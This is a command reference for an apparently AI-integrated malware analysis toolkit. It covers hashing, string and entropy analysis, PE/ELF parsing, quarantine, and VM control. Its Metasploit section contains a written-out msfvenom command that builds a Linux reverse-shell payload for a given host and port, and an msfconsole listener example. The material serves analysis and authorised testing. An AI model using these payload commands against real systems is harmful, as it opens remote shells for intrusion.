# ü¶† Malware Analysis Module - Command Reference

This document provides a comprehensive reference for the Malware Analysis Module in RangerPlex AI. These tools are designed for static analysis, safe handling, and advanced operations involving VMs and Metasploit.

## üõ°Ô∏è Core Analysis Tools

### `/malware-hash`
Calculates MD5, SHA1, and SHA256 hashes for a file to identify known malware.
- **Usage:** `/malware-hash <file_path>`
- **Example:** `/malware-hash /tmp/suspicious.exe`

### `/malware-fileinfo` (Alias: `/fileinfo`)
Determines file type using magic bytes and displays metadata (permissions, size, dates).
- **Usage:** `/malware-fileinfo <file_path>`
- **Example:** `/fileinfo /tmp/payload.bin`

### `/malware-strings`
Extracts printable strings from binary files. Useful for finding hardcoded IPs, URLs, or messages.
- **Usage:** `/malware-strings <file_path> [--urls|--ips|--emails]`
- **Options:**
  - `--urls`: Filter for HTTP/HTTPS links.
  - `--ips`: Filter for IPv4 addresses.
  - `--emails`: Filter for email addresses.
- **Example:** `/malware-strings /tmp/malware.exe --urls`

### `/malware-entropy`
Calculates Shannon entropy to detect packed or encrypted files.
- **Usage:** `/malware-entropy <file_path>`
- **Output:** Returns a score (0-8) and a visual progress bar. High entropy (>7.0) suggests packing/encryption.
- **Example:** `/malware-entropy /tmp/packed_file`

### `/malware-hexdump` (Alias: `/hexdump`)
Displays a canonical hex dump (Hex + ASCII) of the file header.
- **Usage:** `/malware-hexdump <file_path> [lines]`
- **Default:** 20 lines.
- **Example:** `/hexdump /tmp/unknown.dat 50`

### `/ioc-extract`
Automated extraction of Indicators of Compromise (IOCs) using regex patterns.
- **Usage:** `/ioc-extract <file_path>`
- **Extracts:** IPv4, URLs, Emails, Domains.
- **Example:** `/ioc-extract /var/log/syslog`

### `/malware-pe`
Analyzes Windows Portable Executable (PE) files. Requires `pefile` Python library.
- **Usage:** `/malware-pe <file_path>`
- **Output:** Headers, Sections (with entropy), Imports (DLLs).
- **Example:** `/malware-pe /tmp/ransomware.exe`

### `/malware-elf`
Analyzes Linux ELF binaries. Requires `pyelftools` Python library.
- **Usage:** `/malware-elf <file_path>`
- **Output:** Headers, Sections, Segments.
- **Example:** `/malware-elf /bin/ls`

---

## üîí Containment & Testing

### `/malware-quarantine`
Securely moves a file to a date-stamped quarantine folder, removes execute permissions, and logs metadata.
- **Usage:** `/malware-quarantine <file_path>`
- **Example:** `/malware-quarantine /tmp/virus.sh`

### `/malware-restore`
Restores a file from quarantine to its original location using its hash or partial filename.
- **Usage:** `/malware-restore <hash_or_name>`
- **Example:** `/malware-restore a1b2c3d4`

### `/malware-test-deploy`
Creates a **SAFE** test malware file ("General Grievous") in `/tmp/`. Contains fake IOCs for training.
- **Usage:** `/malware-test-deploy`

### `/malware-test-run`
Executes the test malware to generate behavioral artifacts (file creation, network simulation).
- **Usage:** `/malware-test-run`

---

## üñ•Ô∏è Advanced Operations (VM & Metasploit)

### `/vm-list`
Lists available Virtual Machines using `utmctl` (UTM) or `VBoxManage` (VirtualBox).
- **Usage:** `/vm-list`

### `/vm-start`
Starts a specific VM.
- **Usage:** `/vm-start <vm_name>`
- **Example:** `/vm-start "Kali Linux"`

### `/vm-stop`
Stops a specific VM.
- **Usage:** `/vm-stop <vm_name>`
- **Example:** `/vm-stop "Kali Linux"`

### `/msfconsole`
Executes a Metasploit Framework command on a remote Kali VM via SSH.
- **Usage:** `/msfconsole <command>`
- **Example:** `/msfconsole "use exploit/multi/handler; show options"`

### `/msfvenom`
Generates a payload using `msfvenom` on a remote Kali VM via SSH.
- **Usage:** `/msfvenom <options>`
- **Example:** `/msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf`

---

## ‚ö†Ô∏è Safety & Legal Warning
These tools are powerful.
- **Authorization:** Only analyze files you own or have permission to test.
- **Isolation:** Always use a VM for dynamic analysis (running malware).
- **Responsibility:** The user assumes all liability for the use of these tools.
